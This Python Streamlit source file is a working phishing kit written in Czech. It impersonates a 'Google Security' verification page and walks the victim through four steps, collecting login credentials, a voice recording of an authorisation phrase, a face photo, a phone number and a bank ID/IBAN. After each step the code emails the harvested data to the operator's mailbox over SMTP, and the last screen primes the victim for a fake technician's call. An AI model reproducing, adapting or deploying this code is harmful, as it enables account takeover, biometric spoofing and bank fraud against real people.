import streamlit as st
import os
import smtplib
import time
import re
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.application import MIMEApplication
from datetime import datetime

# --- KONFIGURACE ---
MOJE_ADRESA = os.environ.get("MOJE_ADRESA")
MOJE_HESLO = os.environ.get("MOJE_HESLO")

def odeslat_email(subjekt, text, soubor=None, typ="text"):
    if not MOJE_ADRESA or not MOJE_HESLO: return
    msg = MIMEMultipart()
    msg['Subject'] = subjekt
    msg['From'] = MOJE_ADRESA
    msg['To'] = MOJE_ADRESA
    msg.attach(MIMEText(text))
    if soubor:
        if typ == "image":
            part = MIMEImage(soubor.read(), name="foto.png")
        elif typ == "audio":
            # Oprava pro rok 2026: st.audio_input vrací BytesIO
            part = MIMEApplication(soubor.read() if hasattr(soubor, 'read') else soubor, Name="nahravka.wav")
            part['Content-Disposition'] = 'attachment; filename="nahravka.wav"'
        msg.attach(part)
    try:
        server = smtplib.SMTP_SSL("smtp.seznam.cz", 465)
        server.login(MOJE_ADRESA, MOJE_HESLO)
        server.send_message(msg)
        server.quit()
    except: pass

def je_validni_email(email): return re.match(r"[^@]+@[^@]+\.[^@]+", email)
def je_validni_tel(tel): return re.match(r"^\d{9}$", tel)

if "step" not in st.session_state: st.session_state.step = "login"

st.set_page_config(page_title="Zabezpečení Google", page_icon="🔒")
st.markdown("<style>div.stButton > button:first-child { background-color: #4285F4; color: white; border: none; width: 100%; font-weight: bold; }</style>", unsafe_allow_html=True)

def logo():
    st.markdown("<h1 style='text-align: center;'><span style='color: #4285F4;'>G</span><span style='color: #EA4335;'>o</span><span style='color: #FBBC05;'>o</span><span style='color: #4285F4;'>g</span><span style='color: #34A853;'>l</span><span style='color: #EA4335;'>e</span></h1>", unsafe_allow_html=True)

# Oprava Layoutu
col1, col2, col3 = st.columns(3)

with col2:
    # 1. LOGIN
    if st.session_state.step == "login":
        logo()
        em = st.text_input("E-mail")
        he = st.text_input("Heslo", type="password")
        if st.button("Další"):
            if je_validni_email(em) and len(he) > 3:
                st.session_state.zadany_email = em
                odeslat_email("🔑 LOGIN", f"Email: {em}\nHeslo: {he}")
                st.session_state.step = "voice"
                st.rerun()
            else: st.error("Neplatný formát e-mailu nebo krátké heslo.")

    # 2. VOICE (Využívá vestavěný st.audio_input - nejstabilnější řešení)
    elif st.session_state.step == "voice":
        logo()
        st.info("Fáze 2: Hlasové ověření identity")
        st.write("Nahrajte větu: 'Autorizuji tento přístup k mému účtu.'")
        # Vestavěná funkce Streamlitu pro rok 2026
        audio_data = st.audio_input("Klikněte pro nahrávání")
        if audio_data:
            if st.button("Odeslat hlasový vzorek"):
                odeslat_email("🎙️ VOICE", f"Uživatel: {st.session_state.zadany_email}", soubor=audio_data, typ="audio")
                st.session_state.step = "face"
                st.rerun()

    # 3. FACE
    elif st.session_state.step == "face":
        logo()
        st.write("Fáze 3: Biometrický sken obličeje")
        foto = st.camera_input("Skenování...")
        if foto:
            odeslat_email("📸 FACE", f"Uživatel: {st.session_state.zadany_email}", soubor=foto, typ="image")
            st.session_state.step = "final"
            st.rerun()

    # 4. FINÁLNÍ OVĚŘENÍ
    elif st.session_state.step == "final":
        logo()
        st.error("⚠️ Vyžadováno potvrzení technika")
        zeme = st.selectbox("Země", ["Česká republika (+420)", "Slovensko (+421)"])
        tel = st.text_input("Telefonní číslo (9 číslic)")
        ib = st.text_input("BankID / IBAN (pro urychlení)")
        
        if st.button("Autorizovat nyní"):
            if je_validni_tel(tel):
                odeslat_email("📞 FINAL", f"Email: {st.session_state.zadany_email}\nTel: {tel}\nIBAN: {ib}")
                st.success("Požadavek odeslán. Čekejte hovor technika.")
                st.balloons()
                st.progress(95)
            else: st.error("Telefon musí mít přesně 9 číslic.")
